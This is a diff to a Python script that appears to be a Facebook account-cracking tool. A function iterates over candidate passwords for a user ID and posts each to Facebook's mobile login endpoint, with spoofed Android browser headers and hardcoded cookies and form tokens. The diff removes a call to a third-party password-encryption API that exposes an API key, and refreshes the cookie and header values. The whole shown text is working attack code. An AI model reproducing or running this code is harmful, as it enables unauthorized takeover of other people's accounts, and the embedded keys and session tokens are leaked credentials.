@@ -1527,39 +1527,30 @@ def x(uid,pwx,tl):
     try:
         for pw in pwx:
             Session = requests.Session()
-            resp = requests.get("https://password-enc-api-instagram-facebook.p.rapidapi.com/api/pass_enc/",
-            headers={"x-rapidapi-key":"5b5179b509msh1ba72c98ba4d120p1e1335jsn6eb28abafc48","x-rapidapi-host":"password-enc-api-instagram-facebook.p.rapidapi.com"},
-            params={"p":pw,"v":"5","m":"fbweb"}).json()
-            encpass = f'"{resp.get("pass") or resp.get("encpass") or resp.get("result") or next(iter(resp.values()))}"'
             free_fb = Session.get('https://touch.facebook.com').text
             cookies = {
-            'datr': 'yIPWaIDxkIPs2RBXUahPdrLk',
-            'sb': 'yIPWaIx-Gzq5XperMIuqAcyU',
+            'datr': '8DXaB1SvnwaZ5hbQ2sCPlXc',
+            'sb': '_8DXaEnHmj6LT5aIwJa1Uj8v',
             'm_pixel_ratio': '2.4749999046325684',
             'wd': '437x973',
-            'fr': '0mUfsGfmAOBT3Pz6n..Bo1oPI..AAA.0.0.Bo1oPe.AWcZUSs3qoIoZQfYFKYNvlI3vUA',}
+            'fr': '07FJfFNTYTAAGjtaX..Bo18D..AAA.0.0.Bo18Eh.AWeWz7CsNPdq3n0jNAQONzcfwDs',}
             headers = {
-            "authority": "m.facebook.com",
-            "accept": "*/*",
-            "accept-language": "en-US,en;q=0.9",
-            "content-type": "application/x-www-form-urlencoded",
-            "origin": "https://m.facebook.com",
-            "referer": "https://m.facebook.com/",
-            "sec-ch-prefers-color-scheme": "light",
-            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
-            'sec-ch-ua-full-version-list': '"Chromium";v="107.0.5304.74", "Not=A?Brand";v="24.0.0.0"',
-            "sec-ch-ua-mobile": "?1",
-            'sec-ch-ua-model': '"V2060"',
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 13; V2060 Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.7390.43 Mobile Safari/537.36',
+            'Content-Type': 'application/x-www-form-urlencoded',
             'sec-ch-ua-platform': '"Android"',
-            'sec-ch-ua-platform-version': '"13.0.0"',
-            "sec-fetch-dest": "empty",
-            "sec-fetch-mode": "cors",
-            "sec-fetch-site": "same-origin",
-            "user-agent": "Mozilla/5.0 (Linux; Android 13; V2060) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
-            "x-asbd-id": "359341",
-            "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "x-requested-with": "XMLHttpRequest",
-            "x-response-format": "JSONStream",}
+            'sec-ch-ua': '"Android WebView";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
+            'x-response-format': 'JSONStream',
+            'sec-ch-ua-mobile': '?1',
+            'x-asbd-id': '359341',
+            'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'x-requested-with': 'XMLHttpRequest',
+            'origin': 'https://limited.facebook.com',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-dest': 'empty',
+            'referer': 'https://limited.facebook.com/',
+            'accept-language': 'en-US,en;q=0.9',
+            'priority': 'u=1, i',}
             params = {
             'refsrc': 'deprecated',
             'lwv': '100',}
@@ -1578,18 +1569,18 @@ def x(uid,pwx,tl):
             'had_password_prefilled': 'true',
             'is_smart_lock': 'false',
             'bi_xrwh': '92004344361786634',
-            'encpass': encpass,
+            'encpass': pw,
             'fb_dtsg': 'NAfup2Me3JHXJFN2yxBY35qKn-1LtNpMqJhQzaJ3AqYbs8PMFOvFhGw:0:0',
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            '_dyn': '1KQdAG1mws8-t0BBBzEnwuo98nwgU2owpUuwcC4o1nEhw23E52q1ew6ywaq1Jw20Ehw73wGwcq0RE1u81x82ew5fw5NyE1582ZwrU2pw4swSw7zwde0UE',
+            '_dyn': '1KQdAG1mws8-t0BBBzEnwSwgE98nwgU2owpUuwcC4o1nEhw23E52q1ewb60Y82Cwro0wa4o1MUaE36wdq0ny0oi0zE1jU1soG0hi0Lo6-0Co178dE1UU3jwea',
             'csr': '',
             'hsdp': '',
             'hblp': '',
             'sjsp': '',
             'req': '1',
             'fmt': '1',
-            'a': 'AYrzCMozrxxEkLpLMe4Y2HjtqtsmVGwYzrN5JRYYClldhdPtYgFp1Jf_aTSnrZs9GEMJRGEqpBnp7Yr7bbjZFjK5_l3XCV2rjhwTOtu5o4lWwg',
+            'a': 'AYojU8NVK1rXkcFJaGF4VkzUiv2A-dZM6yn0-irpI3CrtPrVNVIxUHN8NijAGxoYcEJUeuJ4MkHcCPqVTEOECKcOJhnJAZGyik6wydEKdLQKJw',
             '_user': '0',}
             urlencoded_string = urllib.parse.urlencode(data)
             url = "https://m.facebook.com/login/device-based/login/async/"
